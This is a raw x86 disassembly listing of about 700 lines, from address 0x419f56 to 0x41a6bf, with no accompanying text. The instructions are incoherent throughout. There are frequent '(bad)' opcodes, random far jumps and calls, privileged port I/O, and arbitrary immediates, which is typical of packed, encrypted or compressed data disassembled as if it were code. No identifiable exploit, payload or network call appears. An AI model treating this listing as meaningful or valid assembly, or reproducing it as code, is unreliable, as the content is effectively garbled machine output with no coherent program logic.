  419f56:	mov    esi,0xb67ff7fa
  419f5b:	iret   
  419f5c:	cmp    al,BYTE PTR [ebp+0x6a80bef9]
  419f62:	jmp    0x419f18
  419f64:	push   es
  419f65:	or     BYTE PTR [ebx-0x1f],0x99
  419f69:	fwait
  419f6a:	pop    eax
  419f6b:	scas   al,BYTE PTR es:[edi]
  419f6c:	(bad)  
  419f6d:	repnz mov DWORD PTR [edi+0x6c],ebx
  419f71:	fst    QWORD PTR [esi]
  419f73:	push   esi
  419f74:	cmp    dh,BYTE PTR [edi]
  419f76:	add    DWORD PTR [edi],0xa976e727
  419f7c:	test   eax,0x42dd672
  419f81:	or     al,0x80
  419f83:	test   DWORD PTR [esi],esi
  419f85:	call   0x5c148428
  419f8a:	inc    edi
  419f8b:	outs   dx,DWORD PTR ds:[esi]
  419f8c:	push   cs
  419f8d:	div    ebp
  419f8f:	lock xor al,0x40
  419f92:	and    ah,0xcf
  419f95:	add    bh,BYTE PTR [ebp+0x5adeaab3]
  419f9b:	sub    DWORD PTR [ecx],edi
  419f9d:	cmp    bh,BYTE PTR [ecx]
  419f9f:	add    ch,BYTE PTR [ebp-0x4aabe599]
  419fa5:	(bad)  
  419fa7:	add    BYTE PTR [esi+eax*2],ah
  419faa:	jmp    0x9647a803
  419faf:	ja     0x419fbd
  419fb1:	inc    edi
  419fb2:	mov    ecx,0xa6756cb0
  419fb7:	iret   
  419fb8:	cld    
  419fb9:	inc    edi
  419fba:	in     eax,dx
  419fbb:	clc    
  419fbc:	jl     0x41a005
  419fbe:	adc    esp,DWORD PTR [esi]
  419fc0:	sbb    al,0x12
  419fc2:	in     eax,dx
  419fc3:	inc    eax
  419fc4:	sti    
  419fc5:	(bad)  
  419fc7:	dec    esi
  419fc8:	sti    
  419fc9:	mov    BYTE PTR [ecx-0x73],ah
  419fcc:	jb     0x41a040
  419fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fcf:	call   0x7cbd09f1
  419fd4:	pop    esp
  419fd5:	iret   
  419fd6:	fisub  WORD PTR [esi+0x38]
  419fd9:	jge    0x419f7a
  419fdb:	mov    ebx,0xcb937aea
  419fe0:	imul   eax,DWORD PTR [ecx+0x274e20c],0xffffffc7
  419fe7:	jnp    0x41a031
  419fe9:	and    DWORD PTR [ebx],edi
  419feb:	clc    
  419fec:	outs   dx,BYTE PTR ds:[esi]
  419fed:	inc    esi
  419fee:	sub    DWORD PTR [eax+edx*2],edi
  419ff1:	inc    esp
  419ff2:	xchg   edi,eax
  419ff3:	arpl   WORD PTR [ebp+0x2b4a75b1],si
  419ff9:	je     0x41a047
  419ffb:	dec    ebp
  419ffc:	test   DWORD PTR [edx+0x5f],ebx
  419fff:	add    al,al
  41a001:	push   eax
  41a002:	push   edi
  41a003:	aaa    
  41a004:	cli    
  41a005:	fnstcw WORD PTR [eax-0x25f7ff9e]
  41a00b:	stc    
  41a00c:	jae    0x419f92
  41a00e:	mov    edx,DWORD PTR [edx+0xd]
  41a011:	mul    BYTE PTR [esi+ecx*2]
  41a014:	mov    bl,bh
  41a016:	sub    ebp,ebp
  41a018:	cwde   
  41a019:	sbb    ecx,DWORD PTR [edx-0x648a6068]
  41a01f:	sub    BYTE PTR [ecx-0x1b642298],bh
  41a025:	cmp    al,0x53
  41a027:	fisttp QWORD PTR [edx-0x67]
  41a02a:	push   ds
  41a02b:	in     eax,dx
  41a02c:	pop    esi
  41a02d:	bound  esp,QWORD PTR ds:[ebp-0x321721d]
  41a034:	xor    DWORD PTR [ecx+ebp*2-0x67],esp
  41a038:	xor    al,0x7b
  41a03a:	xchg   esi,eax
  41a03b:	enter  0x142d,0x69
  41a03f:	les    ebx,FWORD PTR [eax-0x7724e172]
  41a045:	scas   eax,DWORD PTR es:[edi]
  41a046:	sbb    esi,DWORD PTR [ebx-0x63d23e8e]
  41a04c:	cli    
  41a04d:	jg     0x419fcf
  41a04f:	dec    esp
  41a050:	nop
  41a051:	jo     0x41a073
  41a053:	add    eax,0x2e1bf47a
  41a058:	add    esi,DWORD PTR [edi+0x6c7eed14]
  41a05e:	jp     0x41a0a4
  41a060:	pop    ss
  41a061:	je     0x41a0e0
  41a063:	out    dx,al
  41a064:	and    eax,0xbcffdf43
  41a069:	jle    0x41a030
  41a06b:	bound  ecx,QWORD PTR [ebp-0x43]
  41a06e:	out    0xfe,al
  41a070:	ds int 0xd3
  41a073:	ins    BYTE PTR es:[edi],dx
  41a074:	inc    edi
  41a075:	mov    dl,0x62
  41a077:	dec    esi
  41a078:	jmp    0x4beaa739
  41a07d:	or     al,0x48
  41a07f:	repnz stos DWORD PTR es:[edi],eax
  41a081:	test   BYTE PTR [ecx+0x4e],ch
  41a084:	push   eax
  41a085:	sbb    DWORD PTR [edx],edx
  41a087:	ds dec ebp
  41a089:	mov    esi,0xc7013a97
  41a08e:	pop    ss
  41a08f:	ficomp DWORD PTR [esi]
  41a091:	je     0x41a015
  41a093:	xchg   BYTE PTR [edx],dh
  41a095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a096:	dec    ebx
  41a097:	inc    esi
  41a098:	mov    ds,WORD PTR [eax+0x1]
  41a09b:	inc    esi
  41a09c:	or     esp,DWORD PTR [eax+0x44]
  41a09f:	aas    
  41a0a0:	add    al,0x75
  41a0a2:	test   BYTE PTR [esi],ah
  41a0a4:	or     BYTE PTR [edi],0xc5
  41a0a7:	jae    0x41a0de
  41a0a9:	mov    edi,ecx
  41a0ab:	push   esp
  41a0ac:	or     dh,BYTE PTR [edx]
  41a0ae:	outs   dx,BYTE PTR ds:[esi]
  41a0af:	sub    DWORD PTR [edi],edi
  41a0b1:	and    esp,DWORD PTR [eax+0x4d654ee1]
  41a0b7:	pusha  
  41a0b8:	mov    ebx,0xb7749fb
  41a0bd:	pop    ss
  41a0be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0bf:	or     edi,DWORD PTR [eax-0x49]
  41a0c2:	mov    BYTE PTR [ecx+0x1aea37aa],bh
  41a0c8:	fdiv   st(6),st
  41a0ca:	xchg   ebp,eax
  41a0cb:	push   edx
  41a0cc:	inc    edx
  41a0cd:	mov    bh,0x9c
  41a0cf:	inc    ebp
  41a0d0:	adc    eax,0x66aa5583
  41a0d5:	pusha  
  41a0d6:	push   es
  41a0d7:	cli    
  41a0d8:	es jge 0x41a14e
  41a0db:	sbb    esp,DWORD PTR [eax-0x14]
  41a0de:	pop    ebp
  41a0df:	push   es
  41a0e0:	xor    BYTE PTR [edi+0x28],dl
  41a0e3:	icebp  
  41a0e4:	sar    BYTE PTR [bx],0x8b
  41a0e8:	push   esp
  41a0e9:	jle    0x41a096
  41a0eb:	aaa    
  41a0ec:	jo     0x41a08b
  41a0ee:	idiv   al
  41a0f0:	xchg   BYTE PTR [ecx+ecx*1+0x1e],bl
  41a0f4:	or     eax,0x80abf493
  41a0f9:	or     edi,0x4f6b9778
  41a0ff:	jle    0x41a09c
  41a101:	inc    eax
  41a102:	mov    edx,0x7ad31a46
  41a107:	js     0x41a12f
  41a109:	repz jmp DWORD PTR [edi]
  41a10c:	rcr    BYTE PTR [ebp+0x5a],0x20
  41a110:	popa   
  41a111:	add    DWORD PTR ss:[ebx-0x4e0cfa8c],0xffffff95
  41a119:	mov    dh,0x2d
  41a11b:	mov    esi,DWORD PTR [ecx+0x39]
  41a11e:	fimul  WORD PTR [edx+ebp*8+0x26d7cf88]
  41a125:	mov    edi,0x5c8f2b42
  41a12a:	jle    0x41a0ef
  41a12c:	add    al,0x64
  41a12e:	xlat   BYTE PTR ds:[ebx]
  41a12f:	xchg   esp,eax
  41a130:	(bad)  
  41a131:	aam    0xac
  41a133:	sub    al,0x36
  41a135:	mov    ebx,DWORD PTR [edi-0x2cb1a3fb]
  41a13b:	or     eax,0x996041a2
  41a140:	fdivr  st(1),st
  41a142:	into   
  41a143:	test   eax,0xfc928d79
  41a148:	gs pop es
  41a14a:	mov    DWORD PTR [ebp+ebx*2-0x45],edi
  41a14e:	das    
  41a14f:	outs   dx,BYTE PTR ds:[esi]
  41a150:	gs mov ah,0xed
  41a153:	stos   BYTE PTR es:[edi],al
  41a154:	xor    ah,BYTE PTR [ecx+0x60]
  41a157:	dec    esp
  41a158:	inc    eax
  41a159:	fwait
  41a15a:	mov    esp,0x9c575126
  41a15f:	(bad)  
  41a161:	stos   DWORD PTR es:[edi],eax
  41a162:	mov    ch,0x42
  41a164:	xor    eax,0xdb1baf96
  41a169:	int    0xf8
  41a16b:	pop    edx
  41a16c:	cwde   
  41a16d:	pop    eax
  41a16e:	in     al,dx
  41a16f:	in     eax,0xc3
  41a171:	jns    0x41a1d4
  41a173:	xor    BYTE PTR [ebx],ah
  41a175:	xor    DWORD PTR [ebp-0xa],0xffffffaf
  41a179:	adc    ebp,eax
  41a17b:	imul   DWORD PTR [ebp+0xca58cca]
  41a181:	xchg   edx,eax
  41a182:	div    DWORD PTR [eax+0x76]
  41a185:	mov    cl,0xfc
  41a187:	xor    bh,BYTE PTR [edx+0x7e06c6f1]
  41a18d:	xor    al,0x76
  41a18f:	xlat   BYTE PTR ds:[ebx]
  41a190:	mov    al,0xb4
  41a192:	mov    ebp,0x642a6922
  41a197:	xchg   ecx,eax
  41a198:	mov    dh,0xfe
  41a19a:	cmp    edx,edx
  41a19c:	adc    eax,0x3cfc774f
  41a1a1:	data16 or BYTE PTR [ebx],0x75
  41a1a5:	xchg   ecx,eax
  41a1a6:	shl    DWORD PTR [edx+0x5d],cl
  41a1a9:	sbb    eax,0xb5fd0d9d
  41a1ae:	std    
  41a1af:	mov    WORD PTR [ecx-0x66fa944],ss
  41a1b5:	or     dl,al
  41a1b7:	inc    ecx
  41a1b8:	(bad)  
  41a1b9:	adc    esi,DWORD PTR [ebp-0x35]
  41a1bc:	mov    ds:0x9c03be42,al
  41a1c1:	int    0x11
  41a1c3:	push   ebp
  41a1c4:	ss aam 0xcb
  41a1c7:	or     DWORD PTR [ecx+ebx*2+0x207ba39e],esi
  41a1ce:	xchg   esi,eax
  41a1cf:	popf   
  41a1d0:	add    al,BYTE PTR [esi+ecx*4+0x39]
  41a1d4:	pop    ebx
  41a1d5:	jmp    0x41a170
  41a1d7:	iret   
  41a1d8:	add    al,0xa3
  41a1da:	push   cs
  41a1db:	xchg   ebp,eax
  41a1dc:	pop    esp
  41a1dd:	jns    0x41a19e
  41a1df:	nop
  41a1e0:	jmp    0x8645:0x3e4d7ea5
  41a1e7:	fnstsw WORD PTR [ebx]
  41a1e9:	push   cs
  41a1ea:	fwait
  41a1eb:	jb     0x41a1b2
  41a1ed:	jle    0x41a1f2
  41a1ef:	repz jmp 0x41a212
  41a1f2:	les    ebp,FWORD PTR [edi]
  41a1f4:	xor    eax,0x100da588
  41a1f9:	popa   
  41a1fa:	sbb    esi,DWORD PTR ds:0x2a98614a
  41a200:	push   ebp
  41a201:	sbb    eax,edx
  41a203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a205:	cmp    ecx,eax
  41a207:	mov    bl,0xbf
  41a209:	arpl   WORD PTR [ebx*4+0x6c488afb],bp
  41a210:	clc    
  41a211:	pop    es
  41a212:	and    ch,BYTE PTR [edx-0x559633ca]
  41a218:	ja     0x41a276
  41a21a:	lds    edx,FWORD PTR [eax]
  41a21c:	in     al,0x0
  41a21e:	add    BYTE PTR [eax],al
  41a220:	add    BYTE PTR [eax],al
  41a222:	sbb    BYTE PTR [ebp+0xe],dl
  41a225:	add    eax,0x5d1b5f4f
  41a22a:	lods   eax,DWORD PTR ds:[esi]
  41a22b:	test   al,0x5b
  41a22d:	gs push ss
  41a22f:	jae    0x41a1b3
  41a231:	pop    ebp
  41a232:	mov    dh,0x1e
  41a234:	add    DWORD PTR [eax],eax
  41a236:	repz add al,0x0
  41a239:	add    BYTE PTR [edi+0x1],al
  41a23c:	je     0x41a1c5
  41a23e:	aad    0xf6
  41a240:	inc    edi
  41a241:	adc    ebp,ecx
  41a243:	cld    
  41a244:	cli    
  41a245:	out    dx,eax
  41a246:	pop    esp
  41a247:	dec    ebp
  41a248:	jg     0x41a2b0
  41a24a:	mov    ebp,0x7359c7f4
  41a24f:	cdq    
  41a250:	push   ebx
  41a251:	sub    ecx,edi
  41a253:	shr    DWORD PTR [edi],cl
  41a255:	mov    bl,0xcf
  41a257:	rol    BYTE PTR [ebp-0x323d2e4b],0x5a
  41a25e:	leave  
  41a25f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a260:	cmp    al,0xb3
  41a262:	lods   al,BYTE PTR ds:[esi]
  41a263:	sub    al,0x3f
  41a265:	mov    ch,0xb0
  41a267:	fist   WORD PTR [esi-0xae6a596]
  41a26d:	jne    0x41a1f3
  41a26f:	or     eax,0x6c4c99d9
  41a274:	push   eax
  41a275:	push   esp
  41a276:	(bad)  
  41a278:	fistp  WORD PTR [ebp-0x495170cd]
  41a27e:	int    0x66
  41a280:	push   esi
  41a281:	and    dl,BYTE PTR [edx+0x3697a7ce]
  41a287:	mov    cl,BYTE PTR [ebx-0x27]
  41a28a:	adc    eax,0xbeb5a0c2
  41a28f:	jmp    0x3d0e:0x7af5262b
  41a296:	adc    ch,BYTE PTR [edx-0x3091e803]
  41a29c:	jnp    0x41a231
  41a29e:	pop    edx
  41a29f:	mov    ah,0x35
  41a2a1:	mov    eax,ds:0xc7e77994
  41a2a6:	xor    edi,edx
  41a2a8:	pop    DWORD PTR [esi+0x1248544b]
  41a2ae:	call   0x4cb1:0xa5ec7b37
  41a2b5:	icebp  
  41a2b6:	out    0xc3,al
  41a2b8:	jnp    0x41a2ff
  41a2ba:	outs   dx,BYTE PTR ds:[esi]
  41a2bb:	repz (bad) 
  41a2bd:	mov    eax,0xce78b80
  41a2c2:	test   eax,0x329187d4
  41a2c7:	aam    0x81
  41a2c9:	cmp    DWORD PTR [ebx+0x54220af3],0xe129b4aa
  41a2d3:	push   edi
  41a2d4:	pop    es
  41a2d5:	outs   dx,DWORD PTR ds:[esi]
  41a2d6:	jmp    0x41a298
  41a2d8:	imul   eax,ebx,0xb4a94246
  41a2de:	adc    al,0x1e
  41a2e0:	in     eax,dx
  41a2e1:	int3   
  41a2e2:	mov    WORD PTR [ecx-0x66],cs
  41a2e5:	mov    ah,0x29
  41a2e7:	js     0x41a27a
  41a2e9:	mov    ch,0xc9
  41a2eb:	pop    ebx
  41a2ec:	sub    eax,0x322369d5
  41a2f1:	rcr    BYTE PTR [edx-0x4c724d02],1
  41a2f7:	(bad)  
  41a2f8:	mov    ds:0x7d219d39,eax
  41a2fd:	or     ebx,DWORD PTR [ebp+0x14]
  41a300:	mov    edx,0x34687a8a
  41a305:	cli    
  41a306:	dec    edx
  41a307:	xchg   edx,eax
  41a308:	nop
  41a309:	dec    edi
  41a30a:	adc    al,0x7a
  41a30c:	loop   0x41a29e
  41a30e:	arpl   WORD PTR [edi-0x4b],bp
  41a311:	dec    edx
  41a312:	push   eax
  41a313:	mov    WORD PTR [esi+eiz*8+0x22],gs
  41a317:	jae    0x41a35c
  41a319:	xor    eax,0x3ee5d2e
  41a31e:	ret    0x52ac
  41a321:	ror    ebp,1
  41a323:	loope  0x41a2f8
  41a325:	out    0x7c,eax
  41a327:	scas   al,BYTE PTR es:[edi]
  41a328:	stos   BYTE PTR es:[edi],al
  41a329:	(bad)  
  41a32a:	not    BYTE PTR [edi]
  41a32c:	adc    ebx,DWORD PTR [eax-0x7e951]
  41a332:	pop    ds
  41a333:	jmp    0x21c2:0xc53088ec
  41a33a:	leave  
  41a33b:	add    DWORD PTR [eax+edi*8+0x2df7ce99],0x73e7c34d
  41a346:	das    
  41a347:	sub    eax,0x306fcaf2
  41a34c:	inc    edi
  41a34d:	outs   dx,DWORD PTR ds:[esi]
  41a34e:	es dec edi
  41a350:	stc    
  41a351:	mov    ?,WORD PTR [esi+esi*4-0x135435a0]
  41a358:	inc    esp
  41a359:	mov    ds:0x4eba0f11,al
  41a35e:	loope  0x41a3aa
  41a360:	neg    DWORD PTR [edi+0x5a]
  41a363:	ins    BYTE PTR es:[edi],dx
  41a364:	jnp    0x41a32d
  41a366:	xor    eax,0x2f8b425a
  41a36b:	mov    BYTE PTR [eax-0x6f],0x19
  41a36f:	adc    dl,BYTE PTR [ecx-0x18]
  41a372:	test   BYTE PTR [esi],ch
  41a374:	mov    ebp,0x24228f4c
  41a379:	cmp    bh,bl
  41a37b:	push   cs
  41a37c:	sub    esi,ecx
  41a37e:	sub    DWORD PTR [edi],esp
  41a380:	sub    DWORD PTR [ebp-0x5c],ebx
  41a383:	xor    eax,0x6a63a69a
  41a388:	add    BYTE PTR [ebx],0xb7
  41a38b:	rcl    BYTE PTR [edi+0x4b6bfd68],cl
  41a391:	pop    edx
  41a392:	js     0x41a337
  41a394:	popf   
  41a395:	and    DWORD PTR [ebx+eax*4-0x3f500173],edx
  41a39c:	stc    
  41a39d:	jmp    0xe3848e0a
  41a3a2:	je     0x41a3f3
  41a3a4:	adc    edi,0xffffffa1
  41a3a7:	mov    al,0xa6
  41a3a9:	pop    edi
  41a3aa:	loope  0x41a381
  41a3ac:	jae    0x41a41a
  41a3ae:	das    
  41a3af:	dec    edx
  41a3b0:	push   0x2a7afd83
  41a3b5:	mov    esi,ebp
  41a3b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3b8:	mov    cl,0xf8
  41a3ba:	or     BYTE PTR cs:[edi+0x26],cl
  41a3be:	(bad)  [esi]
  41a3c0:	xchg   ebx,eax
  41a3c1:	mov    dh,0x38
  41a3c3:	jns    0x41a3fc
  41a3c5:	mov    gs,WORD PTR [edi+0xb55ea9a]
  41a3cb:	dec    ecx
  41a3cc:	xor    DWORD PTR [edx],0x5fe69d5a
  41a3d2:	cmp    BYTE PTR [eax],bh
  41a3d4:	sbb    eax,0x40540760
  41a3d9:	ret    0xeaa
  41a3dc:	sub    esi,DWORD PTR [esp+ecx*2-0x38]
  41a3e0:	rol    BYTE PTR [edx+0x37],1
  41a3e3:	fsubrp st(0),st
  41a3e5:	dec    esi
  41a3e6:	lods   eax,DWORD PTR ds:[esi]
  41a3e7:	sub    bl,BYTE PTR [ebx-0x5f228a76]
  41a3ed:	jp     0x41a44f
  41a3ef:	jecxz  0x41a3bd
  41a3f1:	xchg   edi,eax
  41a3f2:	xor    BYTE PTR [eax],0x90
  41a3f5:	mov    ebp,es
  41a3f7:	sbb    BYTE PTR [edi+0x3c61f788],dh
  41a3fd:	test   al,0xae
  41a3ff:	pop    edx
  41a400:	sub    BYTE PTR ds:0xf60d4e21,al
  41a406:	ficomp WORD PTR [ecx-0x2a291f32]
  41a40c:	or     DWORD PTR ds:0xc8dc17f5,0x6c0f2307
  41a416:	and    DWORD PTR [edx*2+0x70ed9da8],esi
  41a41d:	std    
  41a41e:	push   0xffffffc5
  41a420:	lods   eax,DWORD PTR ds:[esi]
  41a421:	shld   DWORD PTR [eax+eiz*1],eax,0x87
  41a426:	dec    edx
  41a427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a428:	xchg   al,bl
  41a42a:	fnstsw WORD PTR [esp+edi*2]
  41a42d:	in     al,dx
  41a42e:	mov    ds:0xe55a3efe,eax
  41a433:	cmp    al,0xe7
  41a435:	jo     0x41a496
  41a437:	cdq    
  41a438:	xor    DWORD PTR [ebx-0x7b0b254d],eax
  41a43e:	jle    0x41a3cd
  41a440:	or     BYTE PTR [eax-0x23cdd0a9],ah
  41a446:	aas    
  41a447:	xor    eax,0xb583e356
  41a44c:	adc    eax,ebp
  41a44e:	or     al,0x16
  41a450:	int    0x69
  41a452:	dec    ecx
  41a453:	sbb    al,BYTE PTR [edx+0x65]
  41a456:	mov    esp,0x88071401
  41a45b:	test   BYTE PTR [edi],bh
  41a45d:	sub    esi,eax
  41a45f:	cld    
  41a460:	lahf   
  41a461:	sub    al,0x1e
  41a463:	imul   edi,DWORD PTR [eax+0xb],0xffffffdd
  41a467:	lods   al,BYTE PTR ds:[esi]
  41a468:	cmp    ecx,DWORD PTR [edi+0x49]
  41a46b:	mov    cl,ah
  41a46d:	and    al,0x1
  41a46f:	and    eax,0x26276411
  41a474:	sbb    eax,0x7579a21a
  41a479:	pop    ds
  41a47a:	aas    
  41a47b:	inc    eax
  41a47c:	imul   esi,DWORD PTR [eax-0x49fa9fb1],0x85ed81f0
  41a486:	cmp    ebx,edx
  41a488:	dec    ebp
  41a489:	shl    BYTE PTR [eax],0x4d
  41a48c:	jecxz  0x41a4b6
  41a48e:	xchg   ecx,eax
  41a48f:	and    DWORD PTR ds:0x29b739f6,esi
  41a495:	mov    eax,ds:0x71db7fce
  41a49a:	xchg   ebx,eax
  41a49b:	and    dh,cl
  41a49d:	mov    bl,0x65
  41a49f:	in     al,0x8b
  41a4a1:	ror    DWORD PTR [ebx],0xe5
  41a4a4:	cld    
  41a4a5:	lods   al,BYTE PTR ds:[esi]
  41a4a6:	dec    esi
  41a4a7:	inc    esp
  41a4a8:	idiv   DWORD PTR [ebp+0x1c]
  41a4ab:	es cmp bh,cl
  41a4ae:	pusha  
  41a4af:	adc    eax,ebx
  41a4b1:	loop   0x41a459
  41a4b3:	xchg   esi,eax
  41a4b4:	inc    ecx
  41a4b5:	xchg   edi,eax
  41a4b6:	ret    
  41a4b7:	mov    ebx,0x690dc632
  41a4bc:	stc    
  41a4bd:	sbb    eax,0x50d05e6b
  41a4c2:	aad    0x5f
  41a4c4:	inc    ecx
  41a4c5:	xchg   ebx,eax
  41a4c6:	cdq    
  41a4c7:	(bad)  
  41a4c8:	mov    edi,edx
  41a4ca:	xor    eax,0xf21fe7c
  41a4cf:	add    BYTE PTR [edx-0x74],bl
  41a4d2:	lods   al,BYTE PTR ds:[esi]
  41a4d3:	lods   eax,DWORD PTR ds:[esi]
  41a4d4:	mov    bl,0xa8
  41a4d6:	sub    ebp,eax
  41a4d8:	xchg   esi,eax
  41a4d9:	dec    ebp
  41a4da:	call   DWORD PTR [esi]
  41a4dc:	xor    al,0xa9
  41a4de:	pop    edx
  41a4df:	inc    eax
  41a4e0:	sahf   
  41a4e1:	gs lock addr16 aad 0x5
  41a4e6:	mov    cl,0xaa
  41a4e8:	mov    esi,0x77ea4d14
  41a4ed:	mov    al,0xec
  41a4ef:	pop    edx
  41a4f0:	sti    
  41a4f1:	pop    ebp
  41a4f2:	cmovs  esi,edi
  41a4f5:	inc    esp
  41a4f6:	outs   dx,DWORD PTR ds:[esi]
  41a4f7:	or     al,BYTE PTR [eax-0x175265ae]
  41a4fd:	jne    0x41a565
  41a4ff:	cwde   
  41a500:	mov    dh,0x5
  41a502:	inc    eax
  41a503:	sub    dl,dl
  41a505:	loop   0x41a494
  41a507:	leave  
  41a508:	sbb    eax,0x4eff4ae3
  41a50d:	nop
  41a50e:	ins    BYTE PTR es:[edi],dx
  41a50f:	or     dl,BYTE PTR [eax+edi*1]
  41a512:	iret   
  41a513:	lods   al,BYTE PTR ds:[esi]
  41a514:	scas   al,BYTE PTR es:[edi]
  41a515:	inc    edx
  41a516:	add    DWORD PTR [eax],eax
  41a518:	hlt    
  41a519:	push   ebp
  41a51a:	inc    edi
  41a51b:	mov    DWORD PTR [edi],ecx
  41a51d:	pop    ecx
  41a51e:	jecxz  0x41a525
  41a520:	xchg   esi,eax
  41a521:	and    BYTE PTR [eax+0x2358877b],0x82
  41a528:	mov    eax,0x6b1c2591
  41a52d:	inc    ecx
  41a52e:	sar    BYTE PTR [ecx+0x2453cbbb],0xfc
  41a535:	(bad)  
  41a537:	loop   0x41a4fe
  41a539:	or     al,0x75
  41a53b:	popf   
  41a53c:	inc    esi
  41a53d:	jmp    0xc6ed9f7f
  41a542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a543:	and    eax,0x1f2ee3e1
  41a548:	fidiv  WORD PTR [esi-0x49f8df30]
  41a54e:	mov    ebx,0x82229e83
  41a553:	inc    ebp
  41a554:	dec    edx
  41a555:	mov    eax,0x374d63b7
  41a55a:	sub    DWORD PTR [esp+eiz*4-0x2a8eee63],edi
  41a561:	xchg   ecx,eax
  41a562:	inc    esi
  41a563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a564:	inc    ecx
  41a565:	aad    0x11
  41a567:	cmp    DWORD PTR [eax],0x2c
  41a56a:	mov    bh,0xf0
  41a56c:	xlat   BYTE PTR es:[ebx]
  41a56e:	mov    esi,0x6a44d7b2
  41a573:	jg     0x41a5e1
  41a575:	jecxz  0x41a5ae
  41a577:	adc    edx,DWORD PTR [edi]
  41a579:	dec    edi
  41a57a:	pop    esi
  41a57c:	xor    BYTE PTR [edx-0x4c],cl
  41a57f:	and    eax,0x1cdb07d2
  41a584:	dec    ecx
  41a585:	nop
  41a586:	sahf   
  41a587:	xchg   esi,eax
  41a588:	or     bh,al
  41a58a:	push   esp
  41a58b:	mov    bh,0xa8
  41a58d:	das    
  41a58e:	pusha  
  41a58f:	div    bl
  41a591:	xchg   edi,eax
  41a592:	loop   0x41a601
  41a594:	inc    ebx
  41a595:	shl    DWORD PTR [ebp-0x73],1
  41a598:	xor    eax,edx
  41a59a:	adc    DWORD PTR [edi+0x54c60d16],edx
  41a5a0:	dec    edx
  41a5a1:	push   edx
  41a5a2:	jmp    eax
  41a5a4:	or     DWORD PTR [ecx],0x7
  41a5a7:	jmp    0x41a567
  41a5a9:	(bad)  
  41a5aa:	daa    
  41a5ab:	jbe    0x41a5a6
  41a5ad:	int    0x1f
  41a5af:	in     al,dx
  41a5b0:	cmc    
  41a5b1:	repz adc eax,0x25e0b9e2
  41a5b7:	mov    al,0x29
  41a5b9:	jge    0x41a61e
  41a5bb:	pop    esp
  41a5bc:	or     ebp,DWORD PTR [ebx-0x11]
  41a5bf:	or     eax,DWORD PTR [ecx-0x6]
  41a5c2:	and    al,0x9a
  41a5c4:	jmp    0xf2926bb
  41a5c9:	inc    ecx
  41a5ca:	mov    cl,BYTE PTR [eax+0x2e367455]
  41a5d0:	jno    0x41a5c9
  41a5d2:	nop
  41a5d3:	mul    WORD PTR [eax+0x4]
  41a5d7:	(bad)  
  41a5d8:	(bad)  
  41a5d9:	dec    eax
  41a5da:	xchg   esi,eax
  41a5db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5dc:	cmp    BYTE PTR [ebp-0x5e062a7e],cl
  41a5e2:	jns    0x41a62d
  41a5e4:	lock xchg ecx,eax
  41a5e6:	sbb    al,0xab
  41a5e8:	lea    esp,[edx]
  41a5ea:	fs pop eax
  41a5ec:	(bad)  
  41a5ed:	cmp    al,0x9
  41a5ef:	jb     0x41a617
  41a5f1:	jl     0x41a5c3
  41a5f3:	sti    
  41a5f4:	dec    ebp
  41a5f5:	jmp    0x41a57d
  41a5f7:	int3   
  41a5f8:	out    dx,eax
  41a5f9:	in     eax,0xcf
  41a5fb:	dec    esp
  41a5fc:	and    BYTE PTR [ebx],al
  41a5fe:	jp     0x41a642
  41a600:	shl    DWORD PTR ds:0xb90cfbd2,1
  41a606:	cli    
  41a607:	add    al,0x6d
  41a609:	mov    ds:0x2f90a210,eax
  41a60e:	jg     0x41a5ca
  41a610:	cwde   
  41a611:	sbb    DWORD PTR [esi+0x661a17a8],esp
  41a617:	mov    eax,ds:0xcf3b7a19
  41a61c:	call   0xa48612ab
  41a621:	stc    
  41a622:	or     al,0x74
  41a624:	dec    edx
  41a625:	out    0x21,eax
  41a627:	inc    edi
  41a628:	dec    esp
  41a629:	mov    cl,0x4
  41a62b:	cli    
  41a62c:	mov    DWORD PTR [edx],eax
  41a62e:	add    dh,dh
  41a630:	popf   
  41a631:	dec    ebp
  41a632:	jb     0x41a610
  41a634:	rcr    DWORD PTR [ecx+edi*2+0x48],0x46
  41a639:	ja     0x41a5f2
  41a63b:	mov    esp,0x6effbb77
  41a640:	aad    0xb9
  41a642:	data16 fwait
  41a644:	mov    bl,0x66
  41a646:	jo     0x41a65c
  41a648:	push   ebx
  41a649:	jnp    0x41a634
  41a64b:	jne    0x41a628
  41a64d:	ror    bh,cl
  41a64f:	aad    0x34
  41a651:	push   esp
  41a652:	mov    ds:0xa36fc1d6,eax
  41a657:	mov    WORD PTR [esp+ebp*4+0x30],ss
  41a65b:	js     0x41a638
  41a65d:	rcr    BYTE PTR [esi+0x74],0x76
  41a661:	dec    edi
  41a662:	das    
  41a663:	cmc    
  41a664:	movd   DWORD PTR [ebx-0x53739915],mm5
  41a66b:	mov    DWORD PTR [esi],edx
  41a66d:	jle    0x41a604
  41a66f:	add    BYTE PTR [ebx+0x386cb177],0x8d
  41a676:	xor    bh,BYTE PTR [ebp+ebp*4+0x29224649]
  41a67d:	dec    esi
  41a67e:	or     al,0x26
  41a680:	out    dx,eax
  41a681:	push   edi
  41a682:	mov    ebx,0x11247500
  41a687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a688:	ret    0xa008
  41a68b:	pop    ebx
  41a68c:	jmp    0xc15:0x5431e7c0
  41a693:	popf   
  41a694:	sbb    al,0x25
  41a696:	ror    BYTE PTR [ebx-0x5f],0x98
  41a69a:	xchg   DWORD PTR [ecx],ebp
  41a69c:	or     al,BYTE PTR [esi-0xd6680fe]
  41a6a2:	outs   dx,DWORD PTR ds:[esi]
  41a6a3:	mov    ds:0xaeb89f2e,eax
  41a6a8:	arpl   WORD PTR [eax+0x3e],bp
  41a6ab:	adc    al,0xac
  41a6ad:	cmp    edx,esi
  41a6af:	xor    BYTE PTR [eax-0x7a],ch
  41a6b2:	xchg   ebp,eax
  41a6b3:	leave  
  41a6b4:	scas   eax,DWORD PTR es:[edi]
  41a6b5:	scas   al,BYTE PTR es:[edi]
  41a6b6:	jmp    0x3982:0xe27f3f3a
  41a6bd:	(bad)  
  41a6bf:	je     0x41a71e
